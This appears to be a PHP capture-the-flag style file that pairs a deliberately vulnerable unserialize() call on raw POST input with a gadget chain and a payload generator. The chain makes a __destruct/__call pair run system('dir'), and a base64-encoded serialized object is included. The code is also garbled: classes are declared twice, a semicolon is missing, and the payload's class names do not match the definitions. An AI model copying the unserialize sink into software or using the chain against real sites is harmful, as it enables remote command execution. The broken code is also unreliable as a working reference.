<?php

class getshell
{
    public $hello;
    public $name;

    public function __call($name, $arguments)
    {
        $this->hello[$name]($arguments[0]);
    }
}

class b
{
    public $x;
    public $y;

    public function __destruct()
    {
        $this->x->nihao($this->y);
    }

    public function nihao()
    {
        echo "nihao";

    }
}
$a='TzoxOiJjIjoyOntzOjE6IngiO086NToic2hlbGwiOjE6e3M6NToiaGVsbG8iO2E6MTp7czo1OiJuaWhhbyI7czo2OiJzeXN0ZW0iO319czoxOiJ5IjtzOjM6ImRpciI7fQ=='
@unserialize(base64_decode($_POST['a']));


class getshell
{
    public function __construct()
    {
        $this->hello = ['nihao' => 'system'];
    }

}

class b
{
    public function __construct()
    {
        $this->x = new getshell();
        $this->y = "dir";
    }
}

echo base64_encode(serialize(new c));
